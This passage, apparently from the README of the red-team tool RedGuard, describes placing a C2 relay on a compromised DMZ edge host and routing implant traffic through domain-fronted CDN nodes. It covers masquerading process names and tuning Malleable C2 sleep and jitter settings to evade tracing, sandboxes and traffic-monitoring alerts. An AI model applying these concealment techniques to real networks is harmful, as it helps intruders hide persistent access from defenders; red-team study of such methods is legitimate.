In the attack and defense confrontation scenario, most unit networks are still border-based defense. Here we consider a scenario where the external servers in the DMZ area are often configured with relevant access policies in a normal business environment. At this time, when the external servers at the edge can access the network but cannot directly access the intranet host, the PC or related servers in the intranet do not directly access the public network, but can access the business servers in the DMZ area, then I can use the host of the edge node as an RG node to transfer the intranet online traffic to our C2 facilities. Does it sound very similar to the conventional proxy transfer online? However, this is just a form of display of the skill implementation. Let's continue to look at more TIPS.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660187188707.png)

When we take down an edge host during the management process, assuming that we have taken over the Shell permissions, we will deploy RG on this server as our front-end node** (in actual scenarios, configuration files are hard-coded in the program, and even the Trojan horse and RG are combined into the same program)**.

**The configuration file is as follows:**

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660183480032.png)

For the specific configuration, we mainly focus on the arrows. **The arrow 1 above is the HOST domain name for the interaction between the intranet host and the edge node**. It is recommended to set the relevant intranet domain name according to the specific scenario of the target unit. Imagine the traffic interaction between two hosts in the intranet about the intranet domain name. Does BT have the courage to directly cut off the interactive traffic? Of course, if they can determine that it is malicious interactive traffic. **The arrow 2 points to the setting of the conventional domain frontend**. This key-value pair, the key corresponds to the online HOST and the value corresponds to the proxy address. Here we can set it to any HTTPS domain name using the same CDN manufacturer**(CDN node IP is also OK, remember to bring http(s):// protocol).**

EdgeHost is the domain name used by our cloud service provider's domain frontend, which is also the domain name used by the RG edge node when interacting with C2 through the CDN node. Yes, RG will modify the HOST domain name of the legitimate request and modify it to the cloud service CDN domain name that can communicate normally.

EdgeTarget is the domain name for intranet interaction, which needs to be the same as arrow 1. Only traffic requested by the domain name set here by HOST will be considered legitimate, and RG will be further modified to the cloud service CDN domain name for subsequent communication.

**Here we summarize:**

That is, the interaction between the edge node and the host in the intranet is through the set intranet domain name. When the Trojan initiates a request to the edge node of the RG, it will determine whether the request traffic HOST is the intranet domain name set in the configuration file. If it is in compliance, it is considered legitimate. The RG will modify the HOST to the cloud service provider CDN domain name set by the EdgeHost for subsequent communication and transfer the traffic to the C2 server, achieving full concealment and high obfuscation of the entire link. Imagine that the intranet domain name interacts with the edge node with the intranet domain name, but the edge node further changes the actual interactive proxy address and interactive HOST, achieving an asymmetric interactive information between the two hosts, making tracing more difficult and difficult to investigate.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/66b9e60fb8303b3c6b457cc8134a436.png)

**Interaction traffic between edge nodes and intranet hosts, as shown in the figure above**

Another advantage of this approach is that in the cloud sandbox environment, since our interactive IP is customized according to the intranet, it is impossible for the sandbox to perform connectivity correlation analysis on the intranet IP during analysis.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/9f247da30a078c83079465a55d6df6d.jpg)

One thing to note when configuring is that the HOST for the Trojan request should be:

- **HOST: Intranet domain name (set in the RG configuration file)**
- **IP: Intranet IP of edge host**
- **Online port: 443 (matches the http(s) listening port in the RG configuration file)**
- **Listening port: the port where C2 is actually online**

The C2 listener settings are as follows:

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/1660189311172.jpg)

In contrast to the request, the HOST of the C2 listener should be the CDN domain name of the cloud service provider, as long as the final traffic can be transferred to the C2 server.

Intranet node interaction traffic, as shown in the figure below, it can be seen that the intranet IP in the DMZ area normally accesses port 443. It is not surprising that the intranet server or PC is connected to the business system in the DMZ area.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/e84350da6fc7e5b0195177047cf945c.jpg)

The interactive traffic of the edge host is shown in the figure. In actual scenarios, there will not be a large number of TIME_WAIT. Here, I set the heartbeat packet sleep to 0 for testing. It is safer to set a larger heartbeat packet jitter and sleep time in actual scenarios. And I personally think that HTTP traffic is not used in actual scenarios. Isn't plain text traffic a waste of time? So generally this port will not be opened. We will change the RG file name to Tomcat, Apache, Nginx, etc. to make the interaction look more confusing.

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/2d703582e313f535c6c4f48b922bed8.jpg)

Regarding the heartbeat packet jitter and sleep time, you can simply set the following fields in the Malleable C2 Profile file.

```bash
set sleeptime "3000";
set jitter    "20";
```

If you do not set it, an abnormal heartbeat packet alarm may appear. Of course, in most cases, researchers will think it is a false alarm and ignore it. However, for the sake of safety, it is recommended to configure it so that it will not cause an abnormal heartbeat packet alarm. At that time, it was tested by 360 NDR equipment, and the specific effect is as follows:

![image.png](https://github.com/wikiZ/RedGuardImage/raw/main/3b15f94c57fa78bcf31cd67f4b8f191.jpg)

As for HTTPS traffic, any traffic monitoring device on the market cannot censor traffic. Current monitoring devices are essentially sensitive word matching. Even in a certain manufacturer's equipment data packet detection competition, it is required to use plaintext packets, which makes people wonder whether RTs really interact with plaintext traffic in actual combat scenarios? In addition to the asymmetric interactive information mentioned above, the biggest advantage of this method is that the RG node is placed at the edge node to achieve front-end traffic control, thus giving it the same functional effect as a regular RG.

The back-end nodes of the RG nodes are transformed into CDN nodes to forward to the C2 server. In conventional scenarios, the front-end nodes of the domains are all used as the first-layer request nodes, and the edge hosts are put online after the RG. The interaction between the business system in the DMZ area and the public network CDN IP also looks so harmonious. In this process, neither the intranet host nor the edge host directly interacts with our C2, which is also the elegance of this advanced concealment technique.

**Of course, in addition to the above-mentioned advantages over netsh and iptables proxy transfer, simple configuration and the absence of configuration records are also one of the advantages. **

# 0x05 Loading

Thank you for your support. RedGuard will continue to improve and update it. I hope that RedGuard can be known to more security practitioners. The tool refers to the design ideas of RedWarden.

**We welcome everyone to put forward your needs, RedGuard will continue to grow and improve in these needs!**

**About the developer 风起 related articles:<https://www.anquanke.com/member.html?memberId=148652>**

> 2022Kcon Author of the weapon spectrum of the hacker conference
>
> The 10th ISC Internet Security Conference Advanced Offensive and Defensive Forum "C2 Front Flow Control" topic
>
> <https://isc.n.cn/m/pages/live/index?channel_id=iscyY043&ncode=UR6KZ&room_id=1981905&server_id=785016&tab_id=253>
> 
> Exchange C2 traffic based on boundary node links
> 
> <https://www.anquanke.com/post/id/278140>
>
> Analysis of cloud sandbox flow identification technology
>
> <https://www.anquanke.com/post/id/277431>
>
> Realization of JARM Fingerprint Randomization Technology
>
> <https://www.anquanke.com/post/id/276546>
>
> C2 Infrastructure Threat Intelligence Countermeasures
>
> <https://paper.seebug.org/3022/>

**Kunyu: <https://github.com/knownsec/Kunyu>**

> 风起于青萍之末，浪成于微澜之间。

# 0x06 Community

If you have any questions or requirements, you can submit an issue under the project, or contact the developer by adding WeChat.

![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png)
